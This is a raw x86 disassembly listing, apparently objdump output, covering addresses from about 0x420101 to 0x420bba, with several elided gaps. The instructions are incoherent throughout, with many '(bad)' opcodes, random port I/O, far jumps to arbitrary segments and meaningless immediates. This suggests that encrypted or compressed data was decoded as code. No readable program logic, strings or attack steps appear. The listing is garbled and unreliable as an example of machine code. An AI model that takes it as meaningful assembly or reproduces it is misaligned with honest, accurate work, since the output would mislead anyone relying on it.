  420101:	gs test eax,0xca6646f6
  420107:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420108:	and    esi,DWORD PTR [edx+eax*2]
  42010b:	jle    0x420159
  42010d:	xor    BYTE PTR [edi],bh
  42010f:	mov    DWORD PTR [ecx-0x70],edx
  420112:	out    dx,eax
  420113:	fisttp DWORD PTR [ebx]
  420115:	retf   0x23c1
  420118:	cmp    al,0x41
  42011a:	data16 mov BYTE PTR [edx],ch
  42011d:	(bad)  
  42011e:	sahf   
  42011f:	iret   
  420120:	cli    
  420121:	cwde   
  420122:	loopne 0x42019c
  420124:	xchg   edx,eax
  420125:	sub    dh,ch
  420127:	xor    ecx,DWORD PTR [eax-0x307edcaa]
  42012d:	les    ecx,FWORD PTR [ecx-0x2ddae89b]
  420133:	cdq    
  420134:	xchg   ebx,eax
  420135:	jge    0x42010d
  420137:	xor    BYTE PTR [eax],0x97
  42013a:	(bad)  
  42013b:	adc    al,0xca
  42013d:	inc    edx
  42013e:	mov    esi,0xe61c532
  420143:	les    ebp,FWORD PTR [ebx+0x723d2f59]
  420149:	mov    bl,0xdb
  42014b:	pop    esi
  42014c:	mov    WORD PTR [esi-0x18],?
  42014f:	xchg   ebp,eax
  420150:	or     BYTE PTR [edx+0xc],al
  420153:	sbb    al,bh
  420155:	cmp    ecx,DWORD PTR [eax-0x3cd892df]
  42015b:	lods   al,BYTE PTR ds:[esi]
  42015c:	je     0x4200f3
  42015e:	xchg   ecx,eax
  42015f:	xor    DWORD PTR [esp+edx*8-0x29d45866],esp
  420166:	mov    esi,0x653fee2e
  42016b:	fsubp  st(5),st
  42016d:	loop   0x42014e
  42016f:	jne    0x4201d5
  420171:	fsubrp st(0),st
  420173:	jne    0x4201ed
  420175:	mov    edx,0xa7e439aa
  42017a:	leave  
  42017b:	dec    edi
  42017c:	push   esp
  42017d:	jmp    0x4201a6
  42017f:	lea    edx,[edx+ebp*4+0x36]
  420183:	mov    bh,0xf3
  420185:	sti    
  420186:	nop
  420187:	xchg   esp,eax
  420188:	inc    ebx
  420189:	sbb    eax,0xf72e7d9d
  42018e:	jmp    0x42016c
  420190:	lahf   
  420191:	xchg   ecx,eax
  420192:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420193:	xor    BYTE PTR [ebx+0x17],0xbf
  420197:	push   ds
  420198:	pop    edx
  420199:	daa    
  42019a:	sub    eax,0x47170467
  42019f:	push   0x6
  4201a1:	cli    
  4201a2:	fnsave [edi+0x75958823]
  4201a8:	fild   WORD PTR [edx+ebx*8]
  4201ab:	stc    
  4201ac:	in     al,0xb2
  4201ae:	inc    edx
  4201af:	mov    al,0x71
  4201b1:	mov    ecx,0xd85713a9
  4201b6:	fdiv   DWORD PTR [edi+esi*4]
  4201b9:	not    DWORD PTR [edx+ebx*4]
  4201bc:	scas   al,BYTE PTR es:[edi]
  4201bd:	mov    WORD PTR [ebx],cs
  4201bf:	fwait
  4201c0:	and    eax,DWORD PTR [eax]
	...
  420232:	add    BYTE PTR [eax],al
  420234:	push   ecx
  420235:	sbb    edi,edi
  420237:	jmp    si
  42023a:	fnstcw WORD PTR [edi]
  42023c:	mov    DWORD PTR ds:0x75bed010,ebx
  420242:	dec    ecx
  420243:	(bad)  
  420244:	fs pop eax
  420246:	add    DWORD PTR [eax],eax
  420248:	cmc    
  420249:	add    BYTE PTR [eax],al
  42024b:	add    BYTE PTR [ebp-0x78],bh
  42024e:	jg     0x4201ee
  420250:	in     al,dx
  420251:	xchg   edx,eax
  420252:	cmp    BYTE PTR [edi],al
  420254:	lods   al,BYTE PTR ds:[esi]
  420255:	push   ecx
  420256:	cmp    ah,BYTE PTR [edx+0x783c04e]
  42025c:	pop    ebx
  42025d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42025e:	pop    eax
  42025f:	mov    esp,0x11d24f7e
  420264:	mov    dh,0x60
  420266:	mov    eax,0x23908492
  42026b:	mov    cl,BYTE PTR [ebx-0x32]
  42026e:	in     al,0x21
  420270:	push   es
  420271:	adc    BYTE PTR es:[esi+edi*1-0x39051346],bl
  420279:	push   ss
  42027a:	jmp    0x4202bb
  42027c:	mov    eax,0x8c93bc9f
  420281:	inc    edi
  420282:	adc    edx,DWORD PTR [edx]
  420284:	sbb    ah,al
  420286:	dec    edi
  420287:	cs push 0xfffffff4
  42028a:	sub    ch,BYTE PTR [edi-0x346ab260]
  420290:	xchg   esp,eax
  420291:	bound  eax,QWORD PTR [ecx*4+0x95a3187]
  420298:	mov    cl,0x72
  42029a:	test   al,0x5a
  42029c:	icebp  
  42029d:	and    al,0xa
  42029f:	jo     0x4202b2
  4202a1:	mov    dl,0x2
  4202a3:	imul   DWORD PTR [ecx]
  4202a5:	(bad)  [ebx]
  4202a7:	aaa    
  4202a8:	sbb    DWORD PTR [ecx-0x65cbc936],ebp
  4202ae:	mov    eax,0x9454046f
  4202b3:	xchg   BYTE PTR [edi+0x5e],ch
  4202b6:	sbb    BYTE PTR [ecx],bl
  4202b8:	js     0x4202c9
  4202ba:	mov    bl,0x24
  4202bc:	ror    bh,1
  4202be:	cld    
  4202bf:	adc    al,0x6b
  4202c1:	adc    ebp,edi
  4202c3:	inc    esp
  4202c4:	jecxz  0x4202df
  4202c6:	push   edx
  4202c7:	(bad)  
  4202c8:	push   es
  4202c9:	fidivr DWORD PTR [ebx-0x53]
  4202cc:	cmp    ch,BYTE PTR [ebx+ecx*1+0x5f]
  4202d0:	popf   
  4202d1:	or     DWORD PTR ds:0x4bfb4c6f,edi
  4202d7:	arpl   bp,bp
  4202d9:	mov    bh,0xe4
  4202db:	adc    eax,0xf5fed559
  4202e0:	stc    
  4202e1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4202e2:	loop   0x420273
  4202e4:	ret    
  4202e5:	cmp    DWORD PTR [edx],ebp
  4202e7:	sti    
  4202e8:	dec    ebx
  4202e9:	imul   eax,DWORD PTR [edx-0x53],0xffffffdf
  4202ed:	push   ss
  4202ee:	push   ebx
  4202ef:	xchg   edx,eax
  4202f0:	rcl    BYTE PTR [esi],0xc7
  4202f3:	inc    BYTE PTR [esi]
  4202f5:	not    dl
  4202f7:	dec    ebp
  4202f8:	test   eax,0x8e2e5d18
  4202fd:	mov    al,0xa8
  4202ff:	cmp    BYTE PTR [ebp-0x42b46b6a],ah
  420305:	xor    DWORD PTR ds:0x4d7765a5,eax
  42030b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42030c:	lods   eax,DWORD PTR ds:[esi]
  42030d:	retf   0xe68b
  420310:	xchg   esi,eax
  420311:	fld    QWORD PTR [edi-0x5cf9fd8]
  420317:	xchg   esp,eax
  420318:	cmp    BYTE PTR [esi],ah
  42031a:	dec    esi
  42031b:	or     eax,0x83d6638b
  420320:	sub    al,0xa9
  420322:	jb     0x42038a
  420324:	xor    al,0x69
  420326:	sbb    bh,BYTE PTR [ebp+0x7d]
  420329:	push   0x61bdcc46
  42032e:	aad    0xd9
  420330:	and    ah,dl
  420332:	sbb    DWORD PTR [ebx+ecx*4-0x5fe6cd7d],esi
  420339:	mov    al,BYTE PTR [ebp-0x5]
  42033c:	in     eax,0xb1
  42033e:	daa    
  42033f:	push   ss
  420340:	int3   
	...
  4203b1:	add    BYTE PTR [eax],al
  4203b3:	add    BYTE PTR [edi+eiz*8],bh
  4203b6:	imul   ebp,edi,0xfffffffb
  4203b9:	out    dx,eax
  4203ba:	mov    esp,0x889a5af7
  4203bf:	arpl   WORD PTR [ebx],di
  4203c1:	(bad)  
  4203c2:	std    
  4203c3:	xchg   edx,eax
  4203c4:	pop    ecx
  4203c5:	pop    ecx
  4203c6:	add    DWORD PTR [eax],eax
  4203c8:	cmc    
  4203c9:	add    BYTE PTR [eax],al
  4203cb:	add    BYTE PTR [ebx],bl
  4203cd:	dec    ecx
  4203ce:	xchg   esp,eax
  4203cf:	jl     0x420386
  4203d1:	js     0x42038c
  4203d3:	dec    ebx
  4203d4:	inc    eax
  4203d5:	xchg   edx,eax
  4203d6:	(bad)  
  4203d7:	adc    al,0xfa
  4203d9:	xchg   ebp,eax
  4203da:	or     BYTE PTR [ebp-0x6f],dh
  4203dd:	add    edi,DWORD PTR [ebp-0x1a]
  4203e0:	xchg   ecx,eax
  4203e1:	(bad)  
  4203e2:	out    0x83,eax
  4203e4:	stc    
  4203e5:	sub    al,0xea
  4203e7:	mov    ebx,0xe7f25a9b
  4203ec:	out    0xe8,al
  4203ee:	sub    BYTE PTR [esi+0x53d8bebe],0xdb
  4203f5:	jno    0x4203c6
  4203f7:	sub    ecx,DWORD PTR [edi-0x7fd28140]
  4203fd:	xor    BYTE PTR [edx+0x5a],0x29
  420401:	and    bl,BYTE PTR ds:0xe28d726d
  420407:	iret   
  420408:	fidivr WORD PTR [eax]
  42040a:	outs   dx,BYTE PTR ds:[esi]
  42040b:	fwait
  42040c:	retf   0x2eae
  42040f:	out    dx,eax
  420410:	ror    DWORD PTR [eax],cl
  420412:	adc    al,0x76
  420414:	jne    0x4203b7
  420416:	rcr    DWORD PTR [eax-0x39e086ea],0xdb
  42041d:	test   DWORD PTR [ecx+ecx*8+0x541c148b],0x36936884
  420428:	sbb    bl,ah
  42042a:	ins    BYTE PTR es:[edi],dx
  42042b:	imul   ecx,DWORD PTR [edx+0x44a29c27],0x58
  420432:	stc    
  420433:	cmc    
  420434:	ror    DWORD PTR [edx-0x47],0x9f
  420438:	and    dl,BYTE PTR [ecx-0x72]
  42043b:	cmp    DWORD PTR [esi+0x2c],edx
  42043e:	push   ebx
  42043f:	add    bl,BYTE PTR [ebx-0x3b]
  420442:	adc    edi,DWORD PTR [eax-0x379ea1b9]
  420448:	push   edi
  420449:	xor    al,0x2e
  42044b:	jno    0x42046f
  42044d:	push   edi
  42044e:	push   ebp
  42044f:	loopne 0x4204ae
  420451:	jle    0x4204cd
  420453:	daa    
  420454:	ret    
  420455:	rcr    BYTE PTR [ebp+0x68],1
  420458:	jl     0x42044c
  42045a:	imul   edx,DWORD PTR [ecx+0x84ecd0],0x5657d98d
  420464:	xchg   ebp,eax
  420465:	popa   
  420466:	inc    edi
  420467:	test   eax,0x1788c706
  42046c:	call   0x1bf6af72
  420471:	inc    esp
  420472:	jne    0x42047d
  420474:	int3   
  420475:	xchg   ecx,eax
  420476:	sbb    ah,bl
  420478:	mov    ds:0x19e42146,eax
  42047d:	mov    edi,0xb66c9147
  420482:	push   es
  420483:	popa   
  420484:	xor    BYTE PTR [esi-0x7d],ah
  420487:	mov    ch,0x1d
  420489:	stc    
  42048a:	and    al,0x1b
  42048c:	and    DWORD PTR [esi],0xc1d30a17
  420492:	mov    ah,0xb0
  420494:	sar    DWORD PTR [ebx+0x76],0xa0
  420498:	add    DWORD PTR [ebx],0xffffffb3
  42049b:	mov    al,ds:0xd131eab8
  4204a0:	and    al,ah
  4204a2:	cmp    dh,BYTE PTR [edi*1+0x2c11f30d]
  4204a9:	push   edx
  4204aa:	imul   eax,DWORD PTR [ebx-0x6d08f5d9],0xfffffff8
  4204b1:	sti    
  4204b2:	pop    eax
  4204b3:	inc    esp
  4204b4:	jae    0x4204fc
  4204b6:	(bad)  
  4204b7:	mov    eax,ds:0x7b93306f
  4204bc:	es xchg ebx,eax
  4204be:	mul    DWORD PTR [ebp+eax*4+0x0]
	...
  420531:	add    BYTE PTR [eax],al
  420533:	add    BYTE PTR [eax+0x34],bh
  420536:	add    bh,bl
  420538:	dec    esi
  420539:	(bad)  
  42053a:	stc    
  42053b:	mov    bh,0x14
  42053d:	clc    
  42053e:	add    al,0xe1
  420540:	inc    esi
  420541:	or     ebx,edi
  420543:	popf   
  420544:	dec    esi
  420545:	pop    edx
  420546:	add    DWORD PTR [eax],eax
  420548:	cmc    
  420549:	add    BYTE PTR [eax],al
  42054b:	add    BYTE PTR [ebx-0x46224164],dh
  420551:	scas   eax,DWORD PTR es:[edi]
  420552:	jle    0x42059c
  420554:	jp     0x42057e
  420556:	cwde   
  420557:	xchg   esp,eax
  420558:	cli    
  420559:	add    dh,BYTE PTR [edx]
  42055b:	adc    DWORD PTR [ecx-0x5faf6a92],edi
  420561:	sub    BYTE PTR [ebp+edi*4-0x518d6959],ch
  420568:	popf   
  420569:	imul   DWORD PTR [edi]
  42056b:	fisttp DWORD PTR [edx]
  42056d:	popa   
  42056e:	lods   eax,DWORD PTR ds:[esi]
  42056f:	inc    ebp
  420570:	adc    ch,BYTE PTR [esi]
  420572:	jae    0x4205ba
  420574:	xchg   dh,dl
  420576:	push   esi
  420577:	aad    0x76
  420579:	test   eax,0x81ca63e9
  42057e:	jmp    0x214dad82
  420583:	test   ch,dl
  420585:	dec    ebp
  420586:	sub    al,0xd9
  420588:	jmp    0x420521
  42058a:	inc    esi
  42058b:	push   esi
  42058c:	adc    ebp,DWORD PTR [ebx-0x1b2f4379]
  420592:	adc    al,0xb1
  420594:	outs   dx,DWORD PTR ds:[esi]
  420595:	mov    ebx,0xbfbd4596
  42059a:	sub    al,0x90
  42059c:	mov    cl,0xd4
  42059e:	adc    eax,0xeb582a8
  4205a3:	popf   
  4205a4:	mov    WORD PTR [edx],gs
  4205a6:	xchg   esi,eax
  4205a7:	cdq    
  4205a8:	cwde   
  4205a9:	ins    BYTE PTR es:[edi],dx
  4205aa:	sub    DWORD PTR [edx+eax*8-0x3e],eax
  4205ae:	inc    edi
  4205af:	mov    bh,0xd0
  4205b1:	jle    0x4205fa
  4205b3:	add    BYTE PTR [eax+0x44],bh
  4205b6:	test   BYTE PTR [edi+0x18a08099],0x7
  4205bd:	mov    edi,0x1f359a1e
  4205c2:	mov    dl,0x4a
  4205c4:	push   0xd1a1847
  4205c9:	(bad)  
  4205ca:	inc    cl
  4205cc:	rdtsc  
  4205ce:	mov    dl,0x83
  4205d0:	(bad)  
  4205d1:	mov    dl,0xa1
  4205d3:	call   0x6592acdc
  4205d8:	(bad)  
  4205d9:	addr16 add esi,ebx
  4205dc:	mov    eax,ds:0x2bafc123
  4205e1:	sar    DWORD PTR [ecx-0x589d2121],0x61
  4205e8:	mov    al,ds:0x5bf651ba
  4205ed:	add    eax,0xb980c7b3
  4205f2:	xor    al,0xba
  4205f4:	jmp    0x6d75:0x3827099
  4205fb:	and    eax,0xb67803fd
  420600:	loop   0x4205ca
  420602:	rcr    DWORD PTR ds:0x9f4431d6,0x9b
  420609:	adc    eax,0xd4a47ee3
  42060e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42060f:	outs   dx,DWORD PTR ds:[esi]
  420610:	dec    ebx
  420611:	mov    WORD PTR [ecx],ds
  420613:	test   DWORD PTR [eax+0x4d],0xe3444f84
  42061a:	sbb    cl,dh
  42061c:	jl     0x4205db
  42061e:	mov    BYTE PTR [ebx],bl
  420620:	and    edi,DWORD PTR [edx]
  420622:	in     al,0x6a
  420624:	pop    ebp
  420625:	stos   BYTE PTR es:[edi],al
  420626:	sub    al,0xe3
  420628:	popf   
  420629:	and    eax,DWORD PTR [ebp-0x2e]
  42062c:	ss jle 0x420626
  42062f:	mov    ebx,0x503d6001
  420634:	mov    bh,0xba
  420636:	mov    fs,WORD PTR [esi+edi*1-0x59]
  42063a:	xchg   edx,eax
  42063b:	jle    0x420673
  42063d:	aaa    
  42063e:	test   eax,0x8647
	...
  4206b3:	add    BYTE PTR [edx-0x5081dcc4],dl
  4206b9:	jg     0x42069a
  4206bb:	cld    
  4206bc:	jo     0x4206a6
  4206be:	hlt    
  4206bf:	leave  
  4206c0:	stos   DWORD PTR es:[edi],eax
  4206c1:	popa   
  4206c2:	stos   BYTE PTR es:[edi],al
  4206c3:	call   0xf5:0x15b43
  4206ca:	add    BYTE PTR [eax],al
  4206cc:	fdiv   QWORD PTR [eax+0x5a]
  4206cf:	jmp    0xb5829b92
  4206d4:	mov    ebp,0xe47819f1
  4206d9:	mov    ds:0xe247c96c,eax
  4206de:	test   al,dl
  4206e0:	retf   0xe2e2
  4206e3:	aas    
  4206e4:	mov    bh,0xe9
  4206e6:	dec    esi
  4206e7:	in     al,dx
  4206e8:	in     eax,0x9a
  4206ea:	xchg   esi,eax
  4206eb:	fwait
  4206ec:	mov    esi,0x2fda016c
  4206f1:	mov    bh,0xa5
  4206f3:	retf   
  4206f4:	add    edi,DWORD PTR [eax-0x59b26fff]
  4206fa:	inc    ecx
  4206fb:	repnz push edx
  4206fd:	mov    ebp,0x64b0cc7c
  420702:	jecxz  0x42070d
  420704:	fdivr  DWORD PTR [ebp-0x56368538]
  42070a:	mov    esp,0xaa6c553d
  42070f:	lds    edx,FWORD PTR [esi+0x30]
  420712:	ror    BYTE PTR [ecx-0x7f],cl
  420715:	cwde   
  420716:	inc    eax
  420717:	adc    DWORD PTR ds:0x86bbc01c,ebp
  42071d:	retf   0x1531
  420720:	inc    esp
  420721:	lock mov WORD PTR ds:0xe3ec1ec0,ds
  420728:	div    BYTE PTR [edx]
  42072a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42072b:	jmp    0xc8c5ae1b
  420730:	jo     0x4206f6
  420732:	fwait
  420733:	sub    ecx,DWORD PTR [edi+ebp*4-0x4322361]
  42073a:	push   ss
  42073b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42073c:	iret   
  42073d:	mov    dh,0x6b
  42073f:	sbb    esi,DWORD PTR [eax]
  420741:	cdq    
  420742:	les    esp,FWORD PTR [ecx+0x29127531]
  420748:	stc    
  420749:	sub    eax,0xc
  42074c:	jmp    0x5528:0xe1161031
  420753:	xchg   BYTE PTR [ebx+0x67],cl
  420756:	jmp    0x42075e
  420758:	cmp    ch,BYTE PTR [edi-0x22]
  42075b:	and    al,0x35
  42075d:	add    dl,BYTE PTR [ecx-0x72]
  420760:	ret    
  420761:	popf   
  420762:	xchg   esp,eax
  420763:	pop    esi
  420764:	out    dx,eax
  420765:	fcomp  QWORD PTR [edx+0xc]
  420768:	mov    dh,0x5b
  42076a:	dec    eax
  42076b:	paddw  mm6,QWORD PTR [ebp+0x5437822d]
  420772:	pusha  
  420773:	inc    ecx
  420774:	xor    ch,BYTE PTR [ecx+0x44]
  420777:	pop    ss
  420778:	and    edi,edx
  42077a:	adc    eax,DWORD PTR [esi]
  42077c:	or     eax,0x8c4ca77a
  420781:	mov    edi,0xd5d9d5f4
  420786:	shr    ah,0xed
  420789:	sub    al,BYTE PTR [ebp+0xa915fa2]
  42078f:	das    
  420790:	outs   dx,DWORD PTR ds:[esi]
  420791:	cmp    BYTE PTR [ebp-0x74],0x4a
  420795:	dec    eax
  420796:	mov    ds:0x50966890,eax
  42079b:	add    bh,ah
  42079d:	push   edx
  42079e:	shl    ebp,cl
  4207a0:	inc    edx
  4207a1:	mov    ds:0xd33fd18e,al
  4207a6:	pop    eax
  4207a7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4207a8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4207a9:	xchg   esi,eax
  4207aa:	pop    edi
  4207ab:	das    
  4207ac:	mov    es:0xcd18c82a,eax
  4207b2:	sbb    al,0xc7
  4207b4:	push   edx
  4207b5:	rol    DWORD PTR [esi-0x1de1e3be],0x76
  4207bc:	(bad)  
  4207be:	dec    BYTE PTR [ecx]
  4207c0:	retf   0x0
	...
  420833:	add    BYTE PTR [ecx+0x3b920b9a],ah
  420839:	xchg   ebx,eax
  42083a:	mov    ecx,0xafa823bb
  42083f:	mov    bh,0x29
  420841:	cmp    edx,DWORD PTR ds:[ebx]
  420844:	cmp    BYTE PTR [ecx+eax*1+0x0],bl
  420848:	cmc    
  420849:	add    BYTE PTR [eax],al
  42084b:	add    al,ah
  42084d:	xor    eax,DWORD PTR [esi+esi*1]
  420850:	or     eax,DWORD PTR [ecx+ecx*8-0x53]
  420854:	arpl   sp,bp
  420856:	push   ebx
  420857:	jae    0x42087e
  420859:	pop    es
  42085a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42085b:	mov    ecx,0xb43d7622
  420860:	in     eax,dx
  420861:	enter  0xdc44,0x2
  420865:	std    
  420866:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420867:	pop    ecx
  420868:	jp     0x420840
  42086a:	(bad)  
  42086b:	mov    edi,0x4445852a
  420870:	loopne 0x42081f
  420872:	sbb    bl,al
  420874:	hlt    
  420875:	mov    ds:0x3ac590a2,eax
  42087a:	xlat   BYTE PTR ds:[ebx]
  42087b:	cmp    al,0x74
  42087d:	mov    ebp,0xed20e539
  420882:	sub    esi,DWORD PTR [ebp-0x6d445a9b]
  420888:	jmp    0x5c2d40ce
  42088d:	push   ss
  42088e:	sti    
  42088f:	aam    0x31
  420891:	rcl    DWORD PTR [edi+0x20e0704a],1
  420897:	cmp    DWORD PTR [edx-0x3f06f280],0xffffffff
  42089e:	push   edi
  42089f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4208a0:	xchg   ebx,eax
  4208a1:	jbe    0x4208d6
  4208a3:	int    0x8c
  4208a5:	jp     0x4208c4
  4208a7:	lock inc ecx
  4208a9:	cld    
  4208aa:	bound  ebx,QWORD PTR [ecx-0x7]
  4208ad:	mov    edi,DWORD PTR [ebx+0x5e]
  4208b0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4208b1:	jmp    0x4781:0xfa7b971a
  4208b8:	mov    bh,0x17
  4208ba:	pusha  
  4208bb:	pop    ds
  4208bc:	fs jg  0x42092d
  4208bf:	jge    0x4208f3
  4208c1:	jae    0x4208b2
  4208c3:	mov    ?,WORD PTR [ecx-0x447a480f]
  4208c9:	adc    BYTE PTR [ecx+0x14],0x0
  4208cd:	iret   
  4208ce:	out    0x1a,al
  4208d0:	or     BYTE PTR [esi+0x4ae4950],ah
  4208d6:	and    eax,0x1afb8775
  4208db:	sub    BYTE PTR [eax+0x296556c7],dl
  4208e1:	sbb    DWORD PTR [edx+0x20],0x1fccb7f8
  4208e8:	js     0x420943
  4208ea:	aaa    
  4208eb:	mov    ds,WORD PTR [ecx]
  4208ed:	int3   
  4208ee:	mov    ch,0x12
  4208f0:	outs   dx,BYTE PTR ds:[esi]
  4208f1:	pop    es
  4208f2:	fild   WORD PTR [edi-0x668aafc0]
  4208f8:	out    0x52,eax
  4208fa:	jle    0x4208be
  4208fc:	mov    ds:0x63a2364c,al
  420901:	mov    ch,0xa3
  420903:	push   edx
  420904:	cmp    al,0xdf
  420906:	mov    bh,0x15
  420908:	outs   dx,DWORD PTR ds:[esi]
  420909:	ins    BYTE PTR es:[edi],dx
  42090a:	push   eax
  42090b:	outs   dx,DWORD PTR ds:[esi]
  42090c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42090d:	jg     0x420939
  42090f:	jmp    0x975b:0x7d0ba1
  420916:	mov    dh,0xaf
  420918:	enter  0x2eeb,0x1a
  42091c:	adc    ebx,ebx
  42091e:	inc    ecx
  42091f:	mov    ecx,0xc51eea78
  420924:	and    al,0xe6
  420926:	into   
  420927:	sbb    bh,BYTE PTR [esi-0x5edf4eba]
  42092d:	pop    esi
  42092e:	adc    BYTE PTR [eax],dh
  420930:	add    bh,0x9
  420933:	add    cl,BYTE PTR [eax]
  420935:	jmp    0xdd7725a9
  42093a:	call   0x24a9bf3a
  42093f:	adc    DWORD PTR [ebx],esp
	...
  4209b1:	add    BYTE PTR [eax],al
  4209b3:	add    BYTE PTR [edx],cl
  4209b5:	inc    ecx
  4209b6:	mov    bh,0xa1
  4209b8:	push   edi
  4209ba:	push   ds
  4209bb:	jmp    0x42097d
  4209bd:	sahf   
  4209be:	fisub  WORD PTR [esi+0x54]
  4209c1:	jle    0x420974
  4209c3:	addr16 sub eax,0xf500015d
  4209c9:	add    BYTE PTR [eax],al
  4209cb:	add    bl,ch
  4209cd:	ret    
  4209ce:	std    
  4209cf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4209d0:	lods   al,BYTE PTR ds:[esi]
  4209d1:	fsub   QWORD PTR [edx+0x5c]
  4209d4:	cmp    ch,BYTE PTR [esi-0x50]
  4209d7:	loopne 0x420967
  4209d9:	add    DWORD PTR [ecx],ecx
  4209db:	aas    
  4209dc:	mov    WORD PTR [eax],cs
  4209de:	aam    0x95
  4209e0:	(bad)  
  4209e1:	js     0x420a2b
  4209e3:	sub    eax,0x9098def3
  4209e8:	aad    0x91
  4209ea:	sbb    al,0xa4
  4209ec:	and    al,0x4a
  4209ee:	nop
  4209ef:	add    eax,0xf2477959
  4209f4:	and    BYTE PTR ds:0xbdfdddf0,ah
  4209fa:	xchg   DWORD PTR [eax+0x64],ebx
  4209fd:	mov    edx,0xb0055ad9
  420a02:	and    esi,DWORD PTR [esi+ebx*1]
  420a05:	mov    eax,0x5221d8fa
  420a0a:	(bad)  
  420a0b:	mov    ds:0x7b8121f9,al
  420a10:	pop    ebp
  420a11:	jnp    0x4209e7
  420a13:	sti    
  420a14:	xchg   ebx,eax
  420a15:	xor    edx,ecx
  420a17:	jmp    0x420a43
  420a19:	out    0xe6,al
  420a1b:	sbb    BYTE PTR [eax],0x1
  420a1e:	call   0x9581:0xa1f24a0e
  420a25:	add    eax,0x2ceb7865
  420a2a:	sbb    eax,0x7b5ebbdb
  420a2f:	cwde   
  420a30:	adc    BYTE PTR [esi-0x66],ch
  420a33:	pop    ebp
  420a34:	out    dx,eax
  420a35:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420a36:	jp     0x420a98
  420a38:	pop    ecx
  420a39:	stos   BYTE PTR es:[edi],al
  420a3a:	pop    ds
  420a3b:	mov    eax,0xe0843b36
  420a40:	xchg   BYTE PTR [edi],dh
  420a42:	cmc    
  420a43:	jg     0x420a3a
  420a45:	pusha  
  420a46:	add    al,0x29
  420a48:	and    eax,0x69f5724e
  420a4d:	sbb    esi,DWORD PTR [ebx+0x50]
  420a50:	out    dx,eax
  420a51:	inc    edi
  420a52:	mov    esp,0x4a71acdb
  420a57:	add    BYTE PTR [ebx+0x55622ec0],bl
  420a5d:	fcom   DWORD PTR [ebx]
  420a5f:	mov    edx,0xbd81e4fe
  420a64:	pusha  
  420a65:	pop    ebx
  420a66:	xchg   edi,eax
  420a67:	js     0x420a6b
  420a69:	sahf   
  420a6a:	inc    ebx
  420a6b:	push   esi
  420a6c:	imul   edi,DWORD PTR [ecx],0xffffff89
  420a6f:	in     al,0x3b
  420a71:	cs scas eax,DWORD PTR es:[edi]
  420a73:	dec    ecx
  420a74:	into   
  420a75:	rol    dh,1
  420a77:	dec    eax
  420a78:	push   ss
  420a79:	dec    ecx
  420a7a:	lea    ecx,[edx-0x23d30f73]
  420a80:	mov    ch,0x77
  420a82:	div    BYTE PTR [edi-0x21f46699]
  420a88:	call   0x18c5:0xfabec1c5
  420a8f:	aas    
  420a90:	pushf  
  420a91:	ins    BYTE PTR es:[edi],dx
  420a92:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420a93:	mov    cl,0x22
  420a95:	sub    eax,0x7430eb82
  420a9a:	icebp  
  420a9b:	cmp    al,0xf1
  420a9d:	mov    ebx,0xb38de7bd
  420aa2:	jns    0x420b0f
  420aa4:	in     eax,dx
  420aa5:	daa    
  420aa6:	addr16 xchg ebp,eax
  420aa8:	mov    esp,0x2806820a
  420aad:	cmp    al,0x1f
  420aaf:	mov    ecx,0x55f44f45
  420ab4:	jg     0x420a59
  420ab6:	out    0xb6,eax
  420ab8:	pop    ebp
  420ab9:	and    eax,0xcb4fbe6d
  420abe:	add    BYTE PTR [esi+0x47],ch
	...
  420b34:	fsubr  QWORD PTR [eax]
  420b36:	mov    ah,ah
  420b38:	(bad)  
  420b39:	out    0xfe,al
  420b3b:	cmp    BYTE PTR [edi+0x39],dl
  420b3e:	dec    edx
  420b3f:	(bad)  
  420b41:	pop    es
  420b42:	leave  
  420b43:	out    0x22,eax
  420b45:	pop    esi
  420b46:	add    DWORD PTR [eax],eax
  420b48:	cmc    
  420b49:	add    BYTE PTR [eax],al
  420b4b:	add    ah,bh
  420b4d:	ffreep st(3)
  420b4f:	pop    esp
  420b50:	sbb    esp,DWORD PTR [ecx+0x1b4ba85a]
  420b56:	push   edx
  420b57:	addr16 addr16 retf 0xf314
  420b5c:	out    dx,al
  420b5d:	cmp    ebp,DWORD PTR [edi+0x12]
  420b60:	fdivr  st(4),st
  420b62:	add    DWORD PTR [edx-0x4a],ebp
  420b65:	test   al,0xca
  420b67:	or     al,0x1c
  420b69:	into   
  420b6a:	lock xchg ecx,eax
  420b6c:	popa   
  420b6d:	jnp    0x420b2b
  420b6f:	icebp  
  420b70:	rcr    BYTE PTR [ecx-0x2bc89fc9],1
  420b76:	add    DWORD PTR [esi+0x1d],esp
  420b79:	mov    edi,0x9b5d9785
  420b7e:	sub    al,0xd1
  420b80:	daa    
  420b81:	mov    dl,0x12
  420b83:	int3   
  420b84:	shl    DWORD PTR [eax],1
  420b86:	push   ebp
  420b87:	push   cs
  420b88:	push   ds
  420b89:	mov    ebp,0xfe4557e1
  420b8e:	mov    edi,DWORD PTR [eax+0xd]
  420b91:	lahf   
  420b92:	mov    ds:0xdd79d9a5,eax
  420b97:	xchg   ebp,eax
  420b98:	sub    edi,ebx
  420b9a:	scas   eax,DWORD PTR es:[edi]
  420b9b:	sub    dl,BYTE PTR [edx-0x47]
  420b9e:	xchg   edx,eax
  420b9f:	bound  esp,QWORD PTR [ebp-0x1f]
  420ba2:	xor    eax,0x6dd65e23
  420ba7:	cwde   
  420ba8:	push   0x8643b4cf
  420bad:	xchg   ecx,eax
  420bae:	ins    BYTE PTR es:[edi],dx
  420baf:	mov    ch,0x6b
  420bb1:	inc    ebp
  420bb2:	fwait
  420bb3:	aad    0xd3
  420bb5:	mov    eax,0xe08b7cfd
  420bba:	mov    edx,0x71451c0
